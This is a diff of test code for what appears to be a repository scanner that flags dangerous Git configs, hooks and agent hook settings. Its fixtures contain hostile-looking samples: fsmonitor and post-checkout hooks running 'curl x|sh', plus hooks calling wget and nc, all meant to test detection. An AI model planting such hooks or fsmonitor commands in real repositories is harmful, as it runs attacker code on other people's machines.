@@ -3,7 +3,9 @@
 // the CLI by cli-parity.test.ts / parity.test.ts.
 import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
+import { analyzeFiles } from '../../src/engine';
 import { ijsonProblem, numberOutsideSafe } from '../../src/engine/skillpact';
+import type { FileInput } from '../../src/engine/types';
 import { parseCodexToml, TOML_MAX_DEPTH } from '../../src/engine/toml';
 import { HIDDEN_CLASS, HIDDEN_RANGES, INVISIBLE_7 } from '../../src/engine/hiddenChars';
 import { visiblePath } from '../../src/lib/visiblePath';
@@ -64,5 +66,56 @@ describe('hidden characters (UI 8)', () => {
     for (const [a, b] of HIDDEN_RANGES) for (const c of [a, b]) if (c !== 0xfe0e && c !== 0xfe0f) expect(INVISIBLE_7.test(`a${String.fromCodePoint(c)}b`)).toBe(true);
     expect(INVISIBLE_7.test('love ❤️')).toBe(false);
     expect(INVISIBLE_7.test('a️️b')).toBe(true);
+  });
+});
+
+// The same tree is built by tests/run-tests.sh for the CLI, which must give the same rows (round 5, UI 1 / UI 2)
+const GIT_TREE: Record<string, string> = {
+  'README': 'x\n', 'CLAUDE.md': '# a\n',
+  '.git/config': '[include]\n\tpath = extra.cfg\n[include]\n\tpath = ../../outside.cfg\n',
+  '.git/extra.cfg': '[core]\n\tfsmonitor = "curl x|sh"\n',
+  '.git/config.worktree': '[core]\n\tsshCommand = ssh -oProxyCommand=x\n',
+  '.git/hooks/post-checkout': '#!/bin/sh\ncurl x|sh\n', '.git/HEAD': 'ref: refs/heads/main\n',
+  '.git/modules/sub/HEAD': 'ref: refs/heads/main\n', '.git/modules/sub/config': '[core]\n\tfsmonitor = "curl x|sh"\n',
+  '.git/modules/sub/hooks/pre-commit': '#!/bin/sh\necho hi\n', 'sub/.git': 'gitdir: ../.git/modules/sub\n',
+  'wt/.git': 'gitdir: ../gd\n', 'gd/HEAD': 'ref: x\n', 'gd/commondir': '../shared\n', 'gd/hooks/pre-push': '#!/bin/sh\nwget x\n',
+  'shared/hooks/pre-commit': '#!/bin/sh\nnc x 1\n', 'shared/config': '[core]\n\thooksPath = x\n',
+  'out/.git': 'gitdir: ../../elsewhere\n',
+};
+const GIT_ROWS = [
+  'CRITICAL §26 .git/extra.cfg s26.fsmonitor', 'CRITICAL §26 .git/modules/sub/config s26.fsmonitor', 'HIGH §26 .git/config.worktree s26.ssh_command',
+  'HIGH §41 . s41.instructions_and_hooks', 'HIGH §7 .git/hooks/post-checkout s7.git_hook_suspicious', 'HIGH §7 shared/hooks/pre-commit s7.git_hook_suspicious',
+  'MEDIUM §26 shared/config s26.hooks_path', 'MEDIUM §7 .git/modules/sub/hooks/pre-commit s7.git_hook',
+];
+const tree = (root: string, t: Record<string, string>, over: Partial<FileInput> = {}): FileInput[] =>
+  Object.entries(t).map(([p, text]) => ({ relPath: `${root}/${p}`, name: p.slice(p.lastIndexOf('/') + 1), size: text.length, lastModified: 0, text, sha256: null, readState: 'read' as const, ...over }));
+const rowsOf = async (fs: FileInput[], root: string, mods: string[]) => (await analyzeFiles(fs)).findings
+  .filter((f) => mods.includes(f.module)).map((f) => `${f.level} ${f.module} ${f.path === root ? '.' : f.path!.slice(root.length + 1)} ${f.code}`).sort();
+
+describe('Git files and hooks like the CLI (UI 1, UI 2, UI 3)', () => {
+  it('reads config.worktree, include targets, submodule and gitdir: / commondir directories inside the folder', async () => {
+    expect(await rowsOf(tree('g', GIT_TREE), 'g', ['§7', '§26', '§41'])).toEqual(GIT_ROWS);
+  });
+  it('lists the Git files outside the folder as a CLI-only note and records them in errors[]', async () => {
+    const r = await analyzeFiles(tree('g', GIT_TREE));
+    expect(r.gitOutside).toEqual(['../../outside.cfg', '../../elsewhere']);
+    expect(r.errors).toContainEqual({ module: 'core', reason: 'git_include_unresolved:g/.git/config' });
+    expect(r.errors).toContainEqual({ module: 'core', reason: 'gitdir_outside_root:g/out/.git' });
+  });
+  it('§41 with an agent hook config and no Git hook', async () => {
+    expect(await rowsOf(tree('h', { 'AGENTS.md': '# a\n', '.claude/settings.json': '{"hooks":{"PreToolUse":[]}}' }), 'h', ['§41'])).toEqual(['HIGH §41 . s41.instructions_and_hooks']);
+  });
+  it('a hook the browser could not read is HIGH and counts as not scanned', async () => {
+    const fs = [...tree('h', { 'README': 'x\n' }), ...tree('h', { '.git/hooks/post-checkout': '' }, { text: null, readState: 'skipped-size', size: 3_000_000 })];
+    const r = await analyzeFiles(fs);
+    expect(r.findings.filter((f) => f.module === '§7').map((f) => `${f.level} ${f.code}`)).toEqual(['HIGH s7.git_hook_unread']);
+    expect(r.stats.skippedSize).toBe(1);
+  });
+});
+
+describe('skips on the path inside the dropped folder (CLI-10)', () => {
+  it('a dropped folder named node_modules is not skipped as a whole; node_modules inside it is', async () => {
+    const fs = tree('node_modules', { 'pk2/model.pkl': '', 'pk2/node_modules/x/m.pkl': '', 'pk2/m.py': 'import pickle\npickle.loads(b)\n' });
+    expect(await rowsOf(fs, 'node_modules', ['§32', '§36'])).toEqual(['MEDIUM §32 pk2/model.pkl s32.pickle_model', 'MEDIUM §36 pk2/m.py s36.pickle']);
   });
 });
